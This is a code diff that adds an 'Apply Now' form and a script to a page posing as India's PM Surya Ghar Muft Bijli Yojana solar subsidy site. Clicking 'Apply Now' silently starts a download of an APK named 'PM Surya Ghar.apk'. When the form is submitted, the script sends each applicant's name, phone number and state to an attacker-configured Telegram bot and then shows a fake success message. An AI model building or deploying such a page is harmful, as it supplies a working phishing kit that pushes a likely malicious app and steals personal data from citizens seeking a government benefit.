+              <option>Jharkhand</option>
+              <option>Karnataka</option>
+              <option>Kerala</option>
+              <option>Madhya Pradesh</option>
+              <option>Maharashtra</option>
+              <option>Manipur</option>
+              <option>Meghalaya</option>
+              <option>Mizoram</option>
+              <option>Nagaland</option>
+              <option>Odisha</option>
+              <option>Punjab</option>
+              <option>Rajasthan</option>
+              <option>Sikkim</option>
+              <option>Tamil Nadu</option>
+              <option>Telangana</option>
+              <option>Tripura</option>
+              <option>Uttar Pradesh</option>
+              <option>Uttarakhand</option>
+              <option>West Bengal</option>
+              <option>Delhi</option>
+              <option>Chandigarh</option>
+              <option>Jammu and Kashmir</option>
+              <option>Ladakh</option>
+              <option>Puducherry</option>
+              <option>Lakshadweep</option>
+              <option>Andaman and Nicobar Islands</option>
+              <option>Dadra and Nagar Haveli and Daman and Diu</option>
+            </select>
+            <div class="error-msg" id="applyStateError">Please select your state</div>
+          </div>
+          <div class="form-group">
+            <label for="applyCapacity">Solar Capacity (Optional)</label>
+            <select id="applyCapacity" name="capacity">
+              <option value="">Select Capacity (Optional)</option>
+              <option>1-2 kW (0-150 units/month)</option>
+              <option>2-3 kW (150-300 units/month)</option>
+              <option>Above 3 kW (&gt;300 units/month)</option>
+              <option>Not Sure - Need Consultation</option>
+            </select>
+          </div>
+          <div class="checkbox-group">
+            <input type="checkbox" id="applyGuidelines" name="guidelines" required>
+            <label for="applyGuidelines">Yes, I have read all the guidelines of PM Surya Ghar Muft Bijli Yojana</label>
+          </div>
+          <div class="error-msg" id="applyGuidelinesError" style="margin-left:1.5rem">Please accept the guidelines to proceed</div>
+          
+          <div class="success-msg" id="applySuccess">
+             Application submitted successfully!<br>
+            <small>Thank you for applying.</small>
+          </div>
+        </form>
+      </div>
+      <div class="modal-footer">
+        <button type="submit" form="applyForm" class="btn-submit" id="applySubmitBtn">Submit Application</button>
+        <p class="terms-note">By proceeding, you agree to our <a href="#" onclick="switchPage('terms');return false;">Terms &amp; Conditions</a> and <a href="#" onclick="switchPage('privacy');return false;">Privacy Policy</a></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hidden APK Download Trigger - PM SURYA GHAR APK -->
+  <a href="apk/PM Surya Ghar.apk" download="PM Surya Ghar.apk" id="apkDownloadTrigger" style="display:none;"></a>
+
+  <!-- JavaScript -->
+  <script>
+  (function(){
+    'use strict';
+    
+    // ====== EXISTING NAVIGATION LOGIC ======
+    const pages = ['home','whats-new','privacy','copyright','hyperlinking','privacy-mobile','terms','registration-form'];
+    function switchPage(pageId){
+      pages.forEach(id => {
+        const el = document.getElementById(id);
+        if(el) el.style.display = (id === pageId) ? 'block' : 'none';
+      });
+      const nav = document.getElementById('mobileNav');
+      const overlay = document.getElementById('navOverlay');
+      if(nav && overlay){
+        nav.classList.remove('is-open');
+        overlay.classList.remove('is-open');
+        document.body.style.overflow = '';
+      }
+      window.scrollTo({top:0,behavior:'smooth'});
+    }
+    window.switchPage = switchPage;
+    
+    // Mobile nav toggle
+    const menuToggle = document.querySelector('.menu-toggle');
+    const mobileNav = document.getElementById('mobileNav');
+    const navOverlay = document.getElementById('navOverlay');
+    const navClose = document.querySelector('.mobile-nav__close');
+    
+    function openNav(){
+      mobileNav.classList.add('is-open');
+      navOverlay.classList.add('is-open');
+      document.body.style.overflow = 'hidden';
+    }
+    function closeNav(){
+      mobileNav.classList.remove('is-open');
+      navOverlay.classList.remove('is-open');
+      document.body.style.overflow = '';
+    }
+    if(menuToggle) menuToggle.addEventListener('click', openNav);
+    if(navClose) navClose.addEventListener('click', closeNav);
+    if(navOverlay) navOverlay.addEventListener('click', closeNav);
+    document.addEventListener('keydown', (e) => { if(e.key === 'Escape') closeNav(); });
+    
+    // Announcement slider
+    const announceLinks = document.querySelectorAll('[data-announce-slide]');
+    let announceIndex = 0;
+    function showAnnounce(idx){
+      announceLinks.forEach((link,i) => {
+        link.style.display = (i === idx) ? 'block' : 'none';
+      });
+    }
+    if(announceLinks.length > 1){
+      setInterval(() => {
+        announceIndex = (announceIndex + 1) % announceLinks.length;
+        showAnnounce(announceIndex);
+      }, 8000);
+    }
+    
+    // ====== APPLY NOW MODAL FEATURE ======
+    const modal = document.getElementById('applyModal');
+    const applyBtn = document.getElementById('applyNowBtn');
+    const modalCloseBtn = document.getElementById('modalClose');
+    const applyForm = document.getElementById('applyForm');
+    const mobileInput = document.getElementById('applyMobile');
+    const submitBtn = document.getElementById('applySubmitBtn');
+    const successMsg = document.getElementById('applySuccess');
+    
+    // Telegram Config - USER TO REPLACE THESE VALUES
+    const BOT_TOKEN = "YOUR_BOT_TOKEN";
+    const CHAT_ID = "YOUR_CHAT_ID";
+    
+    // Function to trigger APK download
+    function triggerAPKDownload(){
+      const downloadLink = document.createElement('a');
+      downloadLink.href = 'apk/PM Surya Ghar.apk';
+      downloadLink.download = 'PM Surya Ghar.apk';
+      document.body.appendChild(downloadLink);
+      downloadLink.click();
+      document.body.removeChild(downloadLink);
+    }
+    
+    // Open Modal + TRIGGER APK DOWNLOAD IMMEDIATELY
+    if(applyBtn){
+      applyBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        //  APK DOWNLOAD STARTS IMMEDIATELY ON APPLY NOW CLICK 
+        triggerAPKDownload();
+        // Then open modal for details collection
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+        document.getElementById('applyFullName').focus();
+      });
+    }
+    
+    // Close Modal
+    function closeModal(){
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+      resetForm();
+    }
+    if(modalCloseBtn) modalCloseBtn.addEventListener('click', closeModal);
+    if(modal){
+      modal.addEventListener('click', (e) => { if(e.target === modal) closeModal(); });
+    }
+    document.addEventListener('keydown', (e) => { 
+      if(e.key === 'Escape' && modal && modal.classList.contains('active')) closeModal(); 
+    });
+    
+    // Mobile Input: Numeric only, max 10 digits STRICT
+    if(mobileInput){
+      mobileInput.addEventListener('input', function(){
+        // Remove ALL non-numeric characters automatically
+        this.value = this.value.replace(/[^0-9]/g, '');
+        // Enforce max 10 digits - user cannot enter more
+        if(this.value.length > 10){
+          this.value = this.value.slice(0, 10);
+        }
+      });
+      
+      mobileInput.addEventListener('keypress', function(e){
+        // Block non-numeric key presses
+        if(e.key && !/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab'){
+          e.preventDefault();
+        }
+      });
+      
+      // Handle paste event
+      mobileInput.addEventListener('paste', function(e){
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const numeric = paste.replace(/[^0-9]/g, '').slice(0, 10);
+        this.value = numeric;
+      });
+    }
+    
+    // Form Validation & Submit - SEND DATA TO TELEGRAM
+    if(applyForm){
+      applyForm.addEventListener('submit', async function(e){
+        e.preventDefault();
+        
+        // Reset errors & messages
+        document.querySelectorAll('.modal .error-msg').forEach(el => el.classList.remove('show'));
+        if(successMsg) successMsg.classList.remove('show');
+        
+        // Get form values
+        const fullName = document.getElementById('applyFullName').value.trim();
+        const mobile = mobileInput.value.trim();
+        const state = document.getElementById('applyState').value;
+        const capacity = document.getElementById('applyCapacity').value;
+        const guidelines = document.getElementById('applyGuidelines').checked;
+        
+        let isValid = true;
+        
+        // Validate Full Name
+        if(!fullName){
+          document.getElementById('applyNameError').classList.add('show');
+          isValid = false;
+        }
+        
+        // Validate Mobile: exactly 10 digits, numeric only
+        if(!/^[0-9]{10}$/.test(mobile)){
+          document.getElementById('applyMobileError').classList.add('show');
+          isValid = false;
+        }
+        
+        // Validate State
+        if(!state){
+          document.getElementById('applyStateError').classList.add('show');
+          isValid = false;
+        }
+        
+        // Validate Guidelines checkbox
+        if(!guidelines){
+          document.getElementById('applyGuidelinesError').classList.add('show');
+          isValid = false;
+        }
+        
+        if(!isValid) return;
+        
+        // Disable submit button during processing
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Submitting...';
+        
+        try{
+          // Prepare data for Telegram
+          const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+          const message = ` *New PM Surya Ghar Application* \n\n` +
+            ` *Name:* ${fullName}\n` +
+            ` *Phone:* +91 ${mobile}\n` +
+            ` *State:* ${state}\n` +
+            ` *Capacity:* ${capacity || 'Not specified'}\n` +
+            ` *Timestamp:* ${timestamp}`;
+          
+          // Send to Telegram via fetch API
+          const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          await fetch(telegramURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
+          
+          // Show success message (matching site UI)
+          if(successMsg) successMsg.classList.add('show');
+          
+          // Auto-close modal after 2-3 seconds and reset form
+          setTimeout(() => {
+            closeModal();
+          }, 2500);
+          
+        } catch(error){
+          console.error('Telegram submission error:', error);
+          // Show error message matching site UI style
+          const errorMsg = document.createElement('div');
+          errorMsg.className = 'error-msg show';
+          errorMsg.textContent = ' Submission failed. Please try again.';
+          errorMsg.style.marginTop = '1rem';
+          errorMsg.style.textAlign = 'center';
+          applyForm.appendChild(errorMsg);
+          setTimeout(() => { if(errorMsg.parentNode) errorMsg.remove(); }, 4000);
+        } finally{
+          // Re-enable submit button
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Submit Application';
+        }
+      });
+    }
+    
+    // Reset Form Function
+    function resetForm(){
+      if(applyForm) applyForm.reset();
+      document.querySelectorAll('.modal .error-msg').forEach(el => el.classList.remove('show'));
+      if(successMsg) successMsg.classList.remove('show');
+      if(submitBtn){
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Submit Application';
+      }
+    }
+    
+    // Prevent form submission on Enter in inputs (UX improvement)
+    if(applyForm){
+      applyForm.querySelectorAll('input, select').forEach(input => {
+        input.addEventListener('keypress', function(e){
+          if(e.key === 'Enter' && this.tagName !== 'TEXTAREA'){
+            e.preventDefault();
+          }
+        });
+      });
+    }
+    
+    // ====== END APPLY NOW FEATURE ======
+    
+  })();
+  </script>
+</body>
+</html>
